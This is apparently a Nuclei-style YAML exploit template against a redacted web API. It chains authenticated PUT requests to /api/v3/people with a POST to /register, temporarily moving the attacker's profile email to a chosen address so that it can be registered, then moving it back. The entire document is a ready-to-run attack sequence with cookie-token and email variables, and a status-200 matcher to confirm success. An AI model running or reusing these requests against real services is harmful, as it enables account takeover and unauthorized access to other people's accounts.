id: redacted-api-exploit
info:
  name: Redacted API Exploit
  author: pdteam
  severity: high

variables:
  auth_token: "authentication_token from cookie"
  attacker_id: "attacker personal profile id (personId)"
  attacker_email: "attacker email"

http:
  - method: PUT
    path:
      - "{{BaseURL}}/api/v3/people/{{attacker_id}}"
    headers:
      Cookie: "authentication_token={{auth_token}}; remember_token={{auth_token}}"
    body: |
      {
        "person": {
          "email": "{{email}}",
          "profile": {"customer": {}}
        }
      }

  - method: POST
    path:
      - "{{BaseURL}}/register/"
    headers:
      Content-Type: "application/json"
    body: |
      {
        "returnPerson": true,
        "first": "{{email}}",
        "last": "{{email}}",
        "password": "{{email}}",
        "email": "{{email}}"
      }

  - method: PUT
    path:
      - "{{BaseURL}}/api/v3/people/{{attacker_id}}"
    headers:
      Cookie: "authentication_token={{auth_token}}; remember_token={{auth_token}}"
    body: |
      {
        "person": {
          "email": "{{attacker_email}}",
          "profile": {"customer": {}}
        }
      }

input:
  - type: prompt
    message: Enter an email address
    variable: email

matchers:
  - type: status
    status:
      - 200
